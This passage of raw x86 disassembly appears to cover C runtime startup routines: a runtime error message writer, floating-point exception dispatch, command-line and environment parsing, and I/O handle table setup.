  422d6b:	mov    BYTE PTR [ebp-0x8],dl
  422d6e:	call   DWORD PTR ds:0x42803c
  422d74:	test   eax,eax
  422d76:	jne    0x422d8b
  422d78:	lea    eax,[ebp-0x10c]
  422d7e:	push   0x428484
  422d83:	push   eax
  422d84:	call   0x423c40
  422d89:	pop    ecx
  422d8a:	pop    ecx
  422d8b:	lea    eax,[ebp-0x10c]
  422d91:	push   eax
  422d92:	lea    edi,[ebp-0x10c]
  422d98:	call   0x423e70
  422d9d:	inc    eax
  422d9e:	cmp    eax,0x3c
  422da1:	pop    ecx
  422da2:	jbe    0x422dcd
  422da4:	lea    eax,[ebp-0x10c]
  422daa:	push   eax
  422dab:	call   0x423e70
  422db0:	mov    edi,eax
  422db2:	lea    eax,[ebp-0x10c]
  422db8:	sub    eax,0x3b
  422dbb:	push   0x3
  422dbd:	add    edi,eax
  422dbf:	push   0x428480
  422dc4:	push   edi
  422dc5:	call   0x423d40
  422dca:	add    esp,0x10
  422dcd:	push   edi
  422dce:	call   0x423e70
  422dd3:	push   DWORD PTR [esi+0x45c1cc]
  422dd9:	mov    ebx,eax
  422ddb:	call   0x423e70
  422de0:	lea    eax,[ebx+eax*1+0x1c]
  422de4:	pop    ecx
  422de5:	add    eax,0x3
  422de8:	pop    ecx
  422de9:	and    eax,0xfffffffc
  422dec:	call   0x4238b0
  422df1:	mov    ebx,esp
  422df3:	push   0x428464
  422df8:	push   ebx
  422df9:	call   0x423c40
  422dfe:	push   edi
  422dff:	push   ebx
  422e00:	call   0x423c50
  422e05:	push   0x428460
  422e0a:	push   ebx
  422e0b:	call   0x423c50
  422e10:	push   DWORD PTR [esi+0x45c1cc]
  422e16:	push   ebx
  422e17:	call   0x423c50
  422e1c:	push   0x12010
  422e21:	push   0x428438
  422e26:	push   ebx
  422e27:	call   0x423b42
  422e2c:	add    esp,0x2c
  422e2f:	jmp    0x422e56
  422e31:	push   edx
  422e32:	lea    eax,[ebp+0x8]
  422e35:	push   eax
  422e36:	lea    esi,[esi+0x45c1cc]
  422e3c:	push   DWORD PTR [esi]
  422e3e:	call   0x423e70
  422e43:	pop    ecx
  422e44:	push   eax
  422e45:	push   DWORD PTR [esi]
  422e47:	push   0xfffffff4
  422e49:	call   DWORD PTR ds:0x428038
  422e4f:	push   eax
  422e50:	call   DWORD PTR ds:0x428034
  422e56:	lea    esp,[ebp-0x118]
  422e5c:	mov    ecx,DWORD PTR [ebp-0x4]
  422e5f:	xor    ecx,DWORD PTR [ebp+0x4]
  422e62:	call   0x423f2c
  422e67:	pop    edi
  422e68:	pop    esi
  422e69:	pop    ebx
  422e6a:	leave  
  422e6b:	ret    
  422e6c:	mov    eax,ds:0x45cabc
  422e71:	cmp    eax,0x1
  422e74:	je     0x422e83
  422e76:	test   eax,eax
  422e78:	jne    0x422ea4
  422e7a:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422e81:	jne    0x422ea4
  422e83:	push   0xfc
  422e88:	call   0x422cf5
  422e8d:	mov    eax,ds:0x45cb08
  422e92:	test   eax,eax
  422e94:	pop    ecx
  422e95:	je     0x422e99
  422e97:	call   eax
  422e99:	push   0xff
  422e9e:	call   0x422cf5
  422ea3:	pop    ecx
  422ea4:	ret    
  422ea5:	push   ebp
  422ea6:	mov    ebp,esp
  422ea8:	push   ecx
  422ea9:	push   ebx
  422eaa:	push   esi
  422eab:	push   edi
  422eac:	call   0x42370d
  422eb1:	mov    edi,DWORD PTR [ebp+0x8]
  422eb4:	mov    esi,eax
  422eb6:	mov    edx,DWORD PTR [esi+0x54]
  422eb9:	mov    eax,ds:0x45c2dc
  422ebe:	mov    ecx,edx
  422ec0:	cmp    DWORD PTR [ecx],edi
  422ec2:	je     0x422ed1
  422ec4:	lea    ebx,[eax+eax*2]
  422ec7:	add    ecx,0xc
  422eca:	lea    ebx,[edx+ebx*4]
  422ecd:	cmp    ecx,ebx
  422ecf:	jb     0x422ec0
  422ed1:	lea    eax,[eax+eax*2]
  422ed4:	lea    eax,[edx+eax*4]
  422ed7:	cmp    ecx,eax
  422ed9:	jae    0x422edf
  422edb:	cmp    DWORD PTR [ecx],edi
  422edd:	je     0x422ee1
  422edf:	xor    ecx,ecx
  422ee1:	test   ecx,ecx
  422ee3:	je     0x422ffb
  422ee9:	mov    ebx,DWORD PTR [ecx+0x8]
  422eec:	test   ebx,ebx
  422eee:	mov    DWORD PTR [ebp+0x8],ebx
  422ef1:	je     0x422ffb
  422ef7:	cmp    ebx,0x5
  422efa:	jne    0x422f08
  422efc:	and    DWORD PTR [ecx+0x8],0x0
  422f00:	xor    eax,eax
  422f02:	inc    eax
  422f03:	jmp    0x423004
  422f08:	cmp    ebx,0x1
  422f0b:	je     0x422ff6
  422f11:	mov    eax,DWORD PTR [esi+0x58]
  422f14:	mov    DWORD PTR [ebp-0x4],eax
  422f17:	mov    eax,DWORD PTR [ebp+0xc]
  422f1a:	mov    DWORD PTR [esi+0x58],eax
  422f1d:	mov    eax,DWORD PTR [ecx+0x4]
  422f20:	cmp    eax,0x8
  422f23:	jne    0x422fe8
  422f29:	mov    edx,DWORD PTR ds:0x45c2d0
  422f2f:	mov    eax,ds:0x45c2d4
  422f34:	add    eax,edx
  422f36:	cmp    edx,eax
  422f38:	jge    0x422f61
  422f3a:	lea    eax,[edx+edx*2]
  422f3d:	shl    eax,0x2
  422f40:	mov    edi,DWORD PTR [esi+0x54]
  422f43:	and    DWORD PTR [eax+edi*1+0x8],0x0
  422f48:	mov    edi,DWORD PTR ds:0x45c2d0
  422f4e:	mov    ebx,DWORD PTR ds:0x45c2d4
  422f54:	inc    edx
  422f55:	add    ebx,edi
  422f57:	add    eax,0xc
  422f5a:	cmp    edx,ebx
  422f5c:	jl     0x422f40
  422f5e:	mov    ebx,DWORD PTR [ebp+0x8]
  422f61:	mov    ecx,DWORD PTR [ecx]
  422f63:	cmp    ecx,0xc000008e
  422f69:	mov    edi,DWORD PTR [esi+0x5c]
  422f6c:	jne    0x422f77
  422f6e:	mov    DWORD PTR [esi+0x5c],0x83
  422f75:	jmp    0x422fdb
  422f77:	cmp    ecx,0xc0000090
  422f7d:	jne    0x422f88
  422f7f:	mov    DWORD PTR [esi+0x5c],0x81
  422f86:	jmp    0x422fdb
  422f88:	cmp    ecx,0xc0000091
  422f8e:	jne    0x422f99
  422f90:	mov    DWORD PTR [esi+0x5c],0x84
  422f97:	jmp    0x422fdb
  422f99:	cmp    ecx,0xc0000093
  422f9f:	jne    0x422faa
  422fa1:	mov    DWORD PTR [esi+0x5c],0x85
  422fa8:	jmp    0x422fdb
  422faa:	cmp    ecx,0xc000008d
  422fb0:	jne    0x422fbb
  422fb2:	mov    DWORD PTR [esi+0x5c],0x82
  422fb9:	jmp    0x422fdb
  422fbb:	cmp    ecx,0xc000008f
  422fc1:	jne    0x422fcc
  422fc3:	mov    DWORD PTR [esi+0x5c],0x86
  422fca:	jmp    0x422fdb
  422fcc:	cmp    ecx,0xc0000092
  422fd2:	jne    0x422fdb
  422fd4:	mov    DWORD PTR [esi+0x5c],0x8a
  422fdb:	push   DWORD PTR [esi+0x5c]
  422fde:	push   0x8
  422fe0:	call   ebx
  422fe2:	pop    ecx
  422fe3:	mov    DWORD PTR [esi+0x5c],edi
  422fe6:	jmp    0x422fef
  422fe8:	and    DWORD PTR [ecx+0x8],0x0
  422fec:	push   eax
  422fed:	call   ebx
  422fef:	mov    eax,DWORD PTR [ebp-0x4]
  422ff2:	pop    ecx
  422ff3:	mov    DWORD PTR [esi+0x58],eax
  422ff6:	or     eax,0xffffffff
  422ff9:	jmp    0x423004
  422ffb:	push   DWORD PTR [ebp+0xc]
  422ffe:	call   DWORD PTR ds:0x428040
  423004:	pop    edi
  423005:	pop    esi
  423006:	pop    ebx
  423007:	leave  
  423008:	ret    
  423009:	cmp    DWORD PTR ds:0x45d26c,0x0
  423010:	jne    0x423017
  423012:	call   0x42444c
  423017:	push   esi
  423018:	mov    esi,DWORD PTR ds:0x45d274
  42301e:	test   esi,esi
  423020:	jne    0x423029
  423022:	mov    esi,0x42849b
  423027:	jmp    0x42306e
  423029:	mov    al,BYTE PTR [esi]
  42302b:	cmp    al,0x22
  42302d:	jne    0x423057
  42302f:	inc    esi
  423030:	mov    al,BYTE PTR [esi]
  423032:	cmp    al,0x22
  423034:	je     0x423067
  423036:	test   al,al
  423038:	je     0x423050
  42303a:	movzx  eax,al
  42303d:	push   eax
  42303e:	call   0x423f6b
  423043:	test   eax,eax
  423045:	pop    ecx
  423046:	je     0x423049
  423048:	inc    esi
  423049:	inc    esi
  42304a:	mov    al,BYTE PTR [esi]
  42304c:	cmp    al,0x22
  42304e:	jne    0x423036
  423050:	cmp    BYTE PTR [esi],0x22
  423053:	jne    0x423068
  423055:	jmp    0x423067
  423057:	cmp    al,0x20
  423059:	jbe    0x423068
  42305b:	inc    esi
  42305c:	cmp    BYTE PTR [esi],0x20
  42305f:	ja     0x42305b
  423061:	jmp    0x423068
  423063:	cmp    al,0x20
  423065:	ja     0x42306e
  423067:	inc    esi
  423068:	mov    al,BYTE PTR [esi]
  42306a:	test   al,al
  42306c:	jne    0x423063
  42306e:	mov    eax,esi
  423070:	pop    esi
  423071:	ret    
  423072:	push   ebx
  423073:	xor    ebx,ebx
  423075:	cmp    DWORD PTR ds:0x45d26c,ebx
  42307b:	push   esi
  42307c:	push   edi
  42307d:	jne    0x423084
  42307f:	call   0x42444c
  423084:	mov    esi,DWORD PTR ds:0x45cab4
  42308a:	xor    edi,edi
  42308c:	cmp    esi,ebx
  42308e:	jne    0x4230a2
  423090:	jmp    0x4230c2
  423092:	cmp    al,0x3d
  423094:	je     0x423097
  423096:	inc    edi
  423097:	push   esi
  423098:	call   0x423e70
  42309d:	pop    ecx
  42309e:	lea    esi,[esi+eax*1+0x1]
  4230a2:	mov    al,BYTE PTR [esi]
  4230a4:	cmp    al,bl
  4230a6:	jne    0x423092
  4230a8:	lea    eax,[edi*4+0x4]
  4230af:	push   eax
  4230b0:	call   0x424582
  4230b5:	mov    edi,eax
  4230b7:	cmp    edi,ebx
  4230b9:	pop    ecx
  4230ba:	mov    DWORD PTR ds:0x45cae4,edi
  4230c0:	jne    0x4230c7
  4230c2:	or     eax,0xffffffff
  4230c5:	jmp    0x42311f
  4230c7:	mov    esi,DWORD PTR ds:0x45cab4
  4230cd:	push   ebp
  4230ce:	jmp    0x4230fa
  4230d0:	push   esi
  4230d1:	call   0x423e70
  4230d6:	mov    ebp,eax
  4230d8:	inc    ebp
  4230d9:	cmp    BYTE PTR [esi],0x3d
  4230dc:	pop    ecx
  4230dd:	je     0x4230f8
  4230df:	push   ebp
  4230e0:	call   0x424582
  4230e5:	cmp    eax,ebx
  4230e7:	pop    ecx
  4230e8:	mov    DWORD PTR [edi],eax
  4230ea:	je     0x423123
  4230ec:	push   esi
  4230ed:	push   eax
  4230ee:	call   0x423c40
  4230f3:	pop    ecx
  4230f4:	pop    ecx
  4230f5:	add    edi,0x4
  4230f8:	add    esi,ebp
  4230fa:	cmp    BYTE PTR [esi],bl
  4230fc:	jne    0x4230d0
  4230fe:	push   DWORD PTR ds:0x45cab4
  423104:	call   0x42446a
  423109:	mov    DWORD PTR ds:0x45cab4,ebx
  42310f:	mov    DWORD PTR [edi],ebx
  423111:	mov    DWORD PTR ds:0x45d260,0x1
  42311b:	xor    eax,eax
  42311d:	pop    ecx
  42311e:	pop    ebp
  42311f:	pop    edi
  423120:	pop    esi
  423121:	pop    ebx
  423122:	ret    
  423123:	push   DWORD PTR ds:0x45cae4
  423129:	call   0x42446a
  42312e:	mov    DWORD PTR ds:0x45cae4,ebx
  423134:	or     eax,0xffffffff
  423137:	jmp    0x42311d
  423139:	push   ebp
  42313a:	mov    ebp,esp
  42313c:	push   ecx
  42313d:	push   ebx
  42313e:	mov    ebx,DWORD PTR [ebp+0xc]
  423141:	xor    edx,edx
  423143:	cmp    DWORD PTR [ebp+0x8],edx
  423146:	push   edi
  423147:	mov    DWORD PTR [esi],edx
  423149:	mov    edi,ecx
  42314b:	mov    DWORD PTR [ebx],0x1
  423151:	je     0x42315c
  423153:	mov    ecx,DWORD PTR [ebp+0x8]
  423156:	add    DWORD PTR [ebp+0x8],0x4
  42315a:	mov    DWORD PTR [ecx],edi
  42315c:	cmp    BYTE PTR [eax],0x22
  42315f:	jne    0x42316f
  423161:	xor    ecx,ecx
  423163:	test   edx,edx
  423165:	sete   cl
  423168:	inc    eax
  423169:	mov    edx,ecx
  42316b:	mov    cl,0x22
  42316d:	jmp    0x42319c
  42316f:	inc    DWORD PTR [esi]
  423171:	test   edi,edi
  423173:	je     0x42317a
  423175:	mov    cl,BYTE PTR [eax]
  423177:	mov    BYTE PTR [edi],cl
  423179:	inc    edi
  42317a:	mov    cl,BYTE PTR [eax]
  42317c:	movzx  ebx,cl
  42317f:	inc    eax
  423180:	test   BYTE PTR [ebx+0x45cf21],0x4
  423187:	je     0x423195
  423189:	inc    DWORD PTR [esi]
  42318b:	test   edi,edi
  42318d:	je     0x423194
  42318f:	mov    bl,BYTE PTR [eax]
  423191:	mov    BYTE PTR [edi],bl
  423193:	inc    edi
  423194:	inc    eax
  423195:	test   cl,cl
  423197:	mov    ebx,DWORD PTR [ebp+0xc]
  42319a:	je     0x4231ce
  42319c:	test   edx,edx
  42319e:	jne    0x42315c
  4231a0:	cmp    cl,0x20
  4231a3:	je     0x4231aa
  4231a5:	cmp    cl,0x9
  4231a8:	jne    0x42315c
  4231aa:	test   edi,edi
  4231ac:	je     0x4231b2
  4231ae:	and    BYTE PTR [edi-0x1],0x0
  4231b2:	and    DWORD PTR [ebp-0x4],0x0
  4231b6:	cmp    BYTE PTR [eax],0x0
  4231b9:	je     0x423295
  4231bf:	mov    cl,BYTE PTR [eax]
  4231c1:	cmp    cl,0x20
  4231c4:	je     0x4231cb
  4231c6:	cmp    cl,0x9
  4231c9:	jne    0x4231d1
  4231cb:	inc    eax
  4231cc:	jmp    0x4231bf
  4231ce:	dec    eax
  4231cf:	jmp    0x4231b2
  4231d1:	cmp    BYTE PTR [eax],0x0
  4231d4:	je     0x423295
  4231da:	cmp    DWORD PTR [ebp+0x8],0x0
  4231de:	je     0x4231e9
  4231e0:	mov    ecx,DWORD PTR [ebp+0x8]
  4231e3:	add    DWORD PTR [ebp+0x8],0x4
  4231e7:	mov    DWORD PTR [ecx],edi
  4231e9:	inc    DWORD PTR [ebx]
  4231eb:	xor    ebx,ebx
  4231ed:	inc    ebx
  4231ee:	xor    edx,edx
  4231f0:	jmp    0x4231f4
  4231f2:	inc    eax
  4231f3:	inc    edx
  4231f4:	cmp    BYTE PTR [eax],0x5c
  4231f7:	je     0x4231f2
  4231f9:	cmp    BYTE PTR [eax],0x22
  4231fc:	jne    0x423224
  4231fe:	test   dl,0x1
  423201:	jne    0x423222
  423203:	cmp    DWORD PTR [ebp-0x4],0x0
  423207:	je     0x423215
  423209:	lea    ecx,[eax+0x1]
  42320c:	cmp    BYTE PTR [ecx],0x22
  42320f:	jne    0x423215
  423211:	mov    eax,ecx
  423213:	jmp    0x423217
  423215:	xor    ebx,ebx
  423217:	xor    ecx,ecx
  423219:	cmp    DWORD PTR [ebp-0x4],ecx
  42321c:	sete   cl
  42321f:	mov    DWORD PTR [ebp-0x4],ecx
  423222:	shr    edx,1
  423224:	test   edx,edx
  423226:	je     0x423235
  423228:	test   edi,edi
  42322a:	je     0x423230
  42322c:	mov    BYTE PTR [edi],0x5c
  42322f:	inc    edi
  423230:	inc    DWORD PTR [esi]
  423232:	dec    edx
  423233:	jne    0x423228
  423235:	mov    cl,BYTE PTR [eax]
  423237:	test   cl,cl
  423239:	je     0x423283
  42323b:	cmp    DWORD PTR [ebp-0x4],0x0
  42323f:	jne    0x42324b
  423241:	cmp    cl,0x20
  423244:	je     0x423283
  423246:	cmp    cl,0x9
  423249:	je     0x423283
  42324b:	test   ebx,ebx
  42324d:	je     0x42327d
  42324f:	test   edi,edi
  423251:	je     0x42326c
  423253:	movzx  edx,cl
  423256:	test   BYTE PTR [edx+0x45cf21],0x4
  42325d:	je     0x423265
  42325f:	mov    BYTE PTR [edi],cl
  423261:	inc    edi
  423262:	inc    eax
  423263:	inc    DWORD PTR [esi]
  423265:	mov    cl,BYTE PTR [eax]
  423267:	mov    BYTE PTR [edi],cl
  423269:	inc    edi
  42326a:	jmp    0x42327b
  42326c:	movzx  ecx,cl
  42326f:	test   BYTE PTR [ecx+0x45cf21],0x4
  423276:	je     0x42327b
  423278:	inc    eax
  423279:	inc    DWORD PTR [esi]
  42327b:	inc    DWORD PTR [esi]
  42327d:	inc    eax
  42327e:	jmp    0x4231eb
  423283:	test   edi,edi
  423285:	je     0x42328b
  423287:	and    BYTE PTR [edi],0x0
  42328a:	inc    edi
  42328b:	inc    DWORD PTR [esi]
  42328d:	mov    ebx,DWORD PTR [ebp+0xc]
  423290:	jmp    0x4231b6
  423295:	mov    eax,DWORD PTR [ebp+0x8]
  423298:	test   eax,eax
  42329a:	je     0x42329f
  42329c:	and    DWORD PTR [eax],0x0
  42329f:	inc    DWORD PTR [ebx]
  4232a1:	pop    edi
  4232a2:	pop    ebx
  4232a3:	leave  
  4232a4:	ret    
  4232a5:	push   ebp
  4232a6:	mov    ebp,esp
  4232a8:	push   ecx
  4232a9:	push   ecx
  4232aa:	push   ebx
  4232ab:	push   esi
  4232ac:	push   edi
  4232ad:	xor    edi,edi
  4232af:	cmp    DWORD PTR ds:0x45d26c,edi
  4232b5:	jne    0x4232bc
  4232b7:	call   0x42444c
  4232bc:	and    BYTE PTR ds:0x45cc14,0x0
  4232c3:	push   0x104
  4232c8:	mov    esi,0x45cb10
  4232cd:	push   esi
  4232ce:	push   edi
  4232cf:	call   DWORD PTR ds:0x42803c
  4232d5:	mov    eax,ds:0x45d274
  4232da:	cmp    eax,edi
  4232dc:	mov    DWORD PTR ds:0x45caf4,esi
  4232e2:	je     0x4232eb
  4232e4:	cmp    BYTE PTR [eax],0x0
  4232e7:	mov    ebx,eax
  4232e9:	jne    0x4232ed
  4232eb:	mov    ebx,esi
  4232ed:	lea    eax,[ebp-0x4]
  4232f0:	push   eax
  4232f1:	push   edi
  4232f2:	lea    esi,[ebp-0x8]
  4232f5:	xor    ecx,ecx
  4232f7:	mov    eax,ebx
  4232f9:	call   0x423139
  4232fe:	mov    esi,DWORD PTR [ebp-0x4]
  423301:	mov    eax,DWORD PTR [ebp-0x8]
  423304:	shl    esi,0x2
  423307:	add    eax,esi
  423309:	push   eax
  42330a:	call   0x424582
  42330f:	mov    edi,eax
  423311:	add    esp,0xc
  423314:	test   edi,edi
  423316:	jne    0x42331d
  423318:	or     eax,0xffffffff
  42331b:	jmp    0x423342
  42331d:	lea    eax,[ebp-0x4]
  423320:	push   eax
  423321:	lea    ecx,[esi+edi*1]
  423324:	push   edi
  423325:	lea    esi,[ebp-0x8]
  423328:	mov    eax,ebx
  42332a:	call   0x423139
  42332f:	mov    eax,DWORD PTR [ebp-0x4]
  423332:	dec    eax
  423333:	pop    ecx
  423334:	mov    ds:0x45cad8,eax
  423339:	pop    ecx
  42333a:	mov    DWORD PTR ds:0x45cadc,edi
  423340:	xor    eax,eax
  423342:	pop    edi
  423343:	pop    esi
  423344:	pop    ebx
  423345:	leave  
  423346:	ret    
  423347:	push   ecx
  423348:	push   ecx
  423349:	mov    eax,ds:0x45cc18
  42334e:	push   ebx
  42334f:	push   ebp
  423350:	push   esi
  423351:	push   edi
  423352:	mov    edi,DWORD PTR ds:0x428054
  423358:	xor    ebx,ebx
  42335a:	xor    esi,esi
  42335c:	cmp    eax,ebx
  42335e:	push   0x2
  423360:	pop    ebp
  423361:	jne    0x423390
  423363:	call   edi
  423365:	mov    esi,eax
  423367:	cmp    esi,ebx
  423369:	je     0x423377
  42336b:	mov    DWORD PTR ds:0x45cc18,0x1
  423375:	jmp    0x423395
  423377:	call   DWORD PTR ds:0x428010
  42337d:	cmp    eax,0x78
  423380:	jne    0x42338b
  423382:	mov    eax,ebp
  423384:	mov    ds:0x45cc18,eax
  423389:	jmp    0x423390
  42338b:	mov    eax,ds:0x45cc18
  423390:	cmp    eax,0x1
  423393:	jne    0x423412
  423395:	cmp    esi,ebx
  423397:	jne    0x4233a1
  423399:	call   edi
  42339b:	mov    esi,eax
  42339d:	cmp    esi,ebx
  42339f:	je     0x42341a
  4233a1:	cmp    WORD PTR [esi],bx
  4233a4:	mov    eax,esi
  4233a6:	je     0x4233b6
  4233a8:	add    eax,ebp
  4233aa:	cmp    WORD PTR [eax],bx
  4233ad:	jne    0x4233a8
  4233af:	add    eax,ebp
  4233b1:	cmp    WORD PTR [eax],bx
  4233b4:	jne    0x4233a8
  4233b6:	mov    edi,DWORD PTR ds:0x428050
  4233bc:	push   ebx
  4233bd:	push   ebx
  4233be:	push   ebx
  4233bf:	sub    eax,esi
  4233c1:	push   ebx
  4233c2:	sar    eax,1
  4233c4:	inc    eax
  4233c5:	push   eax
  4233c6:	push   esi
  4233c7:	push   ebx
  4233c8:	push   ebx
  4233c9:	mov    DWORD PTR [esp+0x34],eax
  4233cd:	call   edi
  4233cf:	mov    ebp,eax
  4233d1:	cmp    ebp,ebx
  4233d3:	je     0x423407
  4233d5:	push   ebp
  4233d6:	call   0x424582
  4233db:	cmp    eax,ebx
  4233dd:	pop    ecx
  4233de:	mov    DWORD PTR [esp+0x10],eax
  4233e2:	je     0x423407
  4233e4:	push   ebx
  4233e5:	push   ebx
  4233e6:	push   ebp
  4233e7:	push   eax
  4233e8:	push   DWORD PTR [esp+0x24]
  4233ec:	push   esi
  4233ed:	push   ebx
  4233ee:	push   ebx
  4233ef:	call   edi
  4233f1:	test   eax,eax
  4233f3:	jne    0x423403
  4233f5:	push   DWORD PTR [esp+0x10]
  4233f9:	call   0x42446a
  4233fe:	pop    ecx
  4233ff:	mov    DWORD PTR [esp+0x10],ebx
  423403:	mov    ebx,DWORD PTR [esp+0x10]
  423407:	push   esi
  423408:	call   DWORD PTR ds:0x42804c
  42340e:	mov    eax,ebx
  423410:	jmp    0x423462
  423412:	cmp    eax,ebp
  423414:	je     0x42341e
  423416:	cmp    eax,ebx
  423418:	je     0x42341e
  42341a:	xor    eax,eax
  42341c:	jmp    0x423462
  42341e:	call   DWORD PTR ds:0x428048
  423424:	mov    esi,eax
  423426:	cmp    esi,ebx
  423428:	je     0x42341a
  42342a:	cmp    BYTE PTR [esi],bl
  42342c:	je     0x423438
  42342e:	inc    eax
  42342f:	cmp    BYTE PTR [eax],bl
  423431:	jne    0x42342e
  423433:	inc    eax
  423434:	cmp    BYTE PTR [eax],bl
  423436:	jne    0x42342e
  423438:	sub    eax,esi
  42343a:	inc    eax
  42343b:	mov    ebp,eax
  42343d:	push   ebp
  42343e:	call   0x424582
  423443:	mov    edi,eax
  423445:	cmp    edi,ebx
  423447:	pop    ecx
  423448:	jne    0x42344e
  42344a:	xor    edi,edi
  42344c:	jmp    0x423459
  42344e:	push   ebp
  42344f:	push   esi
  423450:	push   edi
  423451:	call   0x4245a0
  423456:	add    esp,0xc
  423459:	push   esi
  42345a:	call   DWORD PTR ds:0x428044
  423460:	mov    eax,edi
  423462:	pop    edi
  423463:	pop    esi
  423464:	pop    ebp
  423465:	pop    ebx
  423466:	pop    ecx
  423467:	pop    ecx
  423468:	ret    
  423469:	sub    esp,0x48
  42346c:	push   ebx
  42346d:	mov    ebx,0x480
  423472:	push   ebx
  423473:	call   0x424582
  423478:	test   eax,eax
  42347a:	pop    ecx
  42347b:	jne    0x423485
  42347d:	or     eax,0xffffffff
  423480:	jmp    0x423662
  423485:	mov    ds:0x45d160,eax
  42348a:	mov    DWORD PTR ds:0x45d148,0x20
  423494:	lea    ecx,[eax+0x480]
  42349a:	jmp    0x4234ba
  42349c:	and    BYTE PTR [eax+0x4],0x0
  4234a0:	or     DWORD PTR [eax],0xffffffff
  4234a3:	and    DWORD PTR [eax+0x8],0x0
  4234a7:	mov    BYTE PTR [eax+0x5],0xa
  4234ab:	mov    ecx,DWORD PTR ds:0x45d160
  4234b1:	add    eax,0x24
  4234b4:	add    ecx,0x480
  4234ba:	cmp    eax,ecx
  4234bc:	jb     0x42349c
  4234be:	push   ebp
  4234bf:	push   esi
  4234c0:	push   edi
  4234c1:	lea    eax,[esp+0x14]
  4234c5:	push   eax
  4234c6:	call   DWORD PTR ds:0x42801c
  4234cc:	cmp    WORD PTR [esp+0x46],0x0
  4234d2:	je     0x4235c1
  4234d8:	mov    eax,DWORD PTR [esp+0x48]
  4234dc:	test   eax,eax
  4234de:	je     0x4235c1
  4234e4:	mov    edi,DWORD PTR [eax]
  4234e6:	lea    ebp,[eax+0x4]
  4234e9:	lea    eax,[edi+ebp*1]
  4234ec:	mov    DWORD PTR [esp+0x10],eax
  4234f0:	mov    eax,0x800
  4234f5:	cmp    edi,eax
  4234f7:	jl     0x4234fb
  4234f9:	mov    edi,eax
  4234fb:	cmp    DWORD PTR ds:0x45d148,edi
  423501:	jge    0x423551
  423503:	mov    esi,0x45d164
  423508:	push   ebx
  423509:	call   0x424582
  42350e:	test   eax,eax
  423510:	pop    ecx
  423511:	je     0x42354b
  423513:	add    DWORD PTR ds:0x45d148,0x20
  42351a:	mov    DWORD PTR [esi],eax
  42351c:	lea    ecx,[eax+0x480]
  423522:	jmp    0x42353a
  423524:	and    BYTE PTR [eax+0x4],0x0
  423528:	or     DWORD PTR [eax],0xffffffff
  42352b:	and    DWORD PTR [eax+0x8],0x0
  42352f:	mov    BYTE PTR [eax+0x5],0xa
  423533:	mov    ecx,DWORD PTR [esi]
  423535:	add    eax,0x24
  423538:	add    ecx,ebx
  42353a:	cmp    eax,ecx
  42353c:	jb     0x423524
  42353e:	add    esi,0x4
  423541:	cmp    DWORD PTR ds:0x45d148,edi
  423547:	jl     0x423508
  423549:	jmp    0x423551
  42354b:	mov    edi,DWORD PTR ds:0x45d148
  423551:	xor    ebx,ebx
  423553:	test   edi,edi
  423555:	jle    0x4235c1
  423557:	mov    eax,DWORD PTR [esp+0x10]
  42355b:	mov    eax,DWORD PTR [eax]
  42355d:	cmp    eax,0xffffffff
  423560:	je     0x4235b6
  423562:	mov    cl,BYTE PTR [ebp+0x0]
  423565:	test   cl,0x1
  423568:	je     0x4235b6
  42356a:	test   cl,0x8
  42356d:	jne    0x42357a
  42356f:	push   eax
  423570:	call   DWORD PTR ds:0x42805c
  423576:	test   eax,eax
  423578:	je     0x4235b6
  42357a:	mov    ecx,ebx
  42357c:	mov    eax,ebx
  42357e:	and    eax,0x1f
  423581:	lea    eax,[eax+eax*8]
  423584:	sar    ecx,0x5
  423587:	mov    ecx,DWORD PTR [ecx*4+0x45d160]
  42358e:	lea    esi,[ecx+eax*4]
  423591:	mov    eax,DWORD PTR [esp+0x10]
  423595:	mov    eax,DWORD PTR [eax]
  423597:	mov    DWORD PTR [esi],eax
  423599:	mov    al,BYTE PTR [ebp+0x0]
  42359c:	mov    BYTE PTR [esi+0x4],al
  42359f:	lea    eax,[esi+0xc]
  4235a2:	push   0xfa0
  4235a7:	push   eax
  4235a8:	call   0x4248ed
  4235ad:	test   eax,eax
  4235af:	pop    ecx
  4235b0:	pop    ecx
  4235b1:	je     0x4235e1
  4235b3:	inc    DWORD PTR [esi+0x8]
  4235b6:	add    DWORD PTR [esp+0x10],0x4
  4235bb:	inc    ebx
  4235bc:	inc    ebp
  4235bd:	cmp    ebx,edi
  4235bf:	jl     0x423557
  4235c1:	xor    ebx,ebx
  4235c3:	mov    ecx,DWORD PTR ds:0x45d160
  4235c9:	lea    eax,[ebx+ebx*8]
  4235cc:	lea    esi,[ecx+eax*4]
  4235cf:	cmp    DWORD PTR [esi],0xffffffff
  4235d2:	jne    0x423643
  4235d4:	test   ebx,ebx
  4235d6:	mov    BYTE PTR [esi+0x4],0x81
  4235da:	jne    0x4235e6
  4235dc:	push   0xfffffff6
  4235de:	pop    eax
  4235df:	jmp    0x4235f0
  4235e1:	or     eax,0xffffffff
  4235e4:	jmp    0x42365f
  4235e6:	mov    eax,ebx
  4235e8:	dec    eax
  4235e9:	neg    eax
  4235eb:	sbb    eax,eax
  4235ed:	add    eax,0xfffffff5
  4235f0:	push   eax
  4235f1:	call   DWORD PTR ds:0x428038
  4235f7:	mov    edi,eax
  4235f9:	cmp    edi,0xffffffff
  4235fc:	je     0x42363d
  4235fe:	push   edi
  4235ff:	call   DWORD PTR ds:0x42805c
  423605:	test   eax,eax
  423607:	je     0x42363d
  423609:	and    eax,0xff
  42360e:	cmp    eax,0x2
  423611:	mov    DWORD PTR [esi],edi
  423613:	jne    0x42361b
  423615:	or     BYTE PTR [esi+0x4],0x40
  423619:	jmp    0x423624
  42361b:	cmp    eax,0x3
  42361e:	jne    0x423624
  423620:	or     BYTE PTR [esi+0x4],0x8
  423624:	lea    eax,[esi+0xc]
  423627:	push   0xfa0
  42362c:	push   eax
  42362d:	call   0x4248ed
  423632:	test   eax,eax
  423634:	pop    ecx
  423635:	pop    ecx
  423636:	je     0x4235e1
  423638:	inc    DWORD PTR [esi+0x8]
  42363b:	jmp    0x423647
  42363d:	or     BYTE PTR [esi+0x4],0x40
  423641:	jmp    0x423647
  423643:	or     BYTE PTR [esi+0x4],0x80
  423647:	inc    ebx
  423648:	cmp    ebx,0x3
  42364b:	jl     0x4235c3
  423651:	push   DWORD PTR ds:0x45d148
  423657:	call   DWORD PTR ds:0x428058
  42365d:	xor    eax,eax
  42365f:	pop    edi
  423660:	pop    esi
  423661:	pop    ebp
  423662:	pop    ebx
  423663:	add    esp,0x48
  423666:	ret    
  423667:	push   0xc
  423669:	push   0x4284a0
  42366e:	call   0x423858
  423673:	mov    DWORD PTR [ebp-0x1c],0x428ef8
  42367a:	cmp    DWORD PTR [ebp-0x1c],0x428ef8
